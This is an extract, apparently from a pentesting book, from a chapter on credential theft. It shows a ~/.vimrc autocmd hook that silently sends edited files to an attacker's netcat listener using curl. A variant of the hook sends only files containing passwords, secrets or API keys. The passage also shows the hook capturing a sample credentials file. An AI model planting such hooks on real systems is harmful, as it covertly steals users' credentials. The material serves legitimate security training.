# Security Chapter Extract
Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
Chapter: 10 - Credential Theft
If you can maintain access to a user’s credential data, or perhaps even to the keyboard actions taken by users, you could keep your access to the system as a whole. For example, if a user reset their password and we happened to intercept the commands used to do so, we could maintain access even if the credentials were rotated (at least until someone discovered and disarmed our mechanism or completely wiped the infected system).
We can capture credential information in a variety of ways. One way is by trojanizing commands, such as by replacing them with malicious binaries or otherwise tampering with their execution flow by injecting malicious logic into them. In this section, we’ll implement malicious logic in a few common system administrator utilities. We’ll also extract credentials from the bash history file and send these over the network.
Security Relevance Score: 5
Word Count: 886
Extracted: 2025-06-13 23:40:57

---

Credential Theft
If you can maintain access to a user’s credential data, or perhaps even to the keyboard actions taken by users, you could keep your access to the system as a whole. For example, if a user reset their password and we happened to intercept the commands used to do so, we could maintain access even if the credentials were rotated (at least until someone discovered and disarmed our mechanism or completely wiped the infected system).
We can capture credential information in a variety of ways. One way is by trojanizing commands, such as by replacing them with malicious binaries or otherwise tampering with their execution flow by injecting malicious logic into them. In this section, we’ll implement malicious logic in a few common system administrator utilities. We’ll also extract credentials from the bash history file and send these over the network.

Hooking a Text Editor
Vim is a common text editor application often found on servers. It’s also many developers’ and system administrators’ go-to text-editing application, so it warrants its own section.

NOTE

If you’ve never used Vim before, we highly recommend you familiarize yourself with it. It’s a powerful editor with many additional capabilities, such as macros, scripts, and a plug-in system.
If you have access to one or more users on the system and can modify configurations in their home directories, you can exploit Vim’s autocmd feature, an automation system able to run certain shell commands when special editor events occur. We define autocmd actions by using the ~/.vimrc file, which Vim usually searches for in the user’s home directory. When the text editor is opened, it reads from this file and looks for any special configurations and instructions.
autocmd events could occur whenever a file is written or read, whenever a file is open or closed, and whenever the editor itself is opened or closed, among other cases. Table 10-1 highlights a few key autocmd events of interest.
Table 10-1: Interesting autocmd Events



Event name
Description




ShellCmdPost
After executing a shell command


BufWritePost
After writing the entire buffer


BufWipeout
Before deleting the buffer


StdinReadPost
After reading from stdin into the buffer



The BufWritePost event allows us to take an action after the editor writes whatever was present in the buffer. This means that if a user opened a file and performed a write action, autocmd would execute our commands.
Let’s exploit this behavior. First, write the following content into the ~/.vimrc file under a user’s home directory. You can use any of the lab’s compromised machines, such as p-jumpbox-01 (172.16.10.13), using the backup or root user:
autocmd BufWritePost *.conf,*.config :silent !timeout 3 curl -m 5 -s
http://172.16.10.1:8080 -o /dev/null --data-binary @<afile> &

Let’s dissect what’s happening. First, we define an autocmd instruction by using the autocmd keyword. Next, we specify the event name BufWritePost, followed by two file extensions, *.conf and *.config. This will ensure that the command triggers whenever a file with the either of these extensions is written.
We use :silent to suppress any command messages or errors. Finally, we define a command with !, followed by the syntax of the shell command of interest. In this example, we’re making an HTTP POST request to 172.16.10.1:8080 by using curl, which will run a listener in our Kali machine. We pass -m (max time) with a value of 5 to ensure that the entire operation doesn’t take more than five seconds. We then pass the -s (silent) argument to stop text from being printed out, and redirect the standard output to /dev/null by using -o /dev/null. We also pass --data-binary @<afile> to upload a file. The autocmd <afile> variable represents the actual file that Vim is editing.
To summarize, when a user writes a file with a name such as credentials.conf, Vim will execute a curl command to secretly send the file to the remote listener. Save this file as ~/.vimrc. Next, open a remote listener on the Kali machine by using any TCP listener of choice:
$ nc -lkvp 8080

listening on [any] 8080 ...

Finally, using either vi or vim.tiny commands (as vi is a symbolic link to vim.tiny in the lab), open a file and write content to it:
$ vim.tiny /tmp/credentials.conf

USER=nostarch
PASS=press123

When you use Vim to save the file to disk, you should notice that the content of the file was sent to the listener:
listening on [any] 8080 ...
172.16.10.13: inverse host lookup failed: Unknown host
connect to [172.16.10.1] from (UNKNOWN) [172.16.10.13] 42538
POST / HTTP/1.1
Host: 172.16.10.1:8080
User-Agent: curl/7.88.1
Accept: */*
Content-Length: 29
Content-Type: application/x-www-form-urlencoded

USER=nostarch
PASS=press123

If you wanted to leak all files, no matter their extension, this autocmd command should do the job:
autocmd BufWritePost * :silent !timeout 1 curl -m 5 -s -o /dev/null
http://172.16.10.1:8080 --data-binary @<afile>

However, if a file is particularly large, the upload could take a long time. This could reveal to the user that something nefarious is happening, as writing to the file would cause a noticeable delay. Let’s make our hook a little cleverer (Listing 10-6).
autocmd BufWritePost *.conf,*.config :silent !if grep "PASSWORD\|SECRET\|APIKEY" <afile>;
then timeout 3 curl -m 5 -s -o /dev/null http://172.16.10.1:8080
--data-binary @<afile>; fi

Listing 10-6: Conditional command execution with autocmd
Now the command will look only for files containing credentials such as passwords or API keys.


Streaming Executed Commands
In
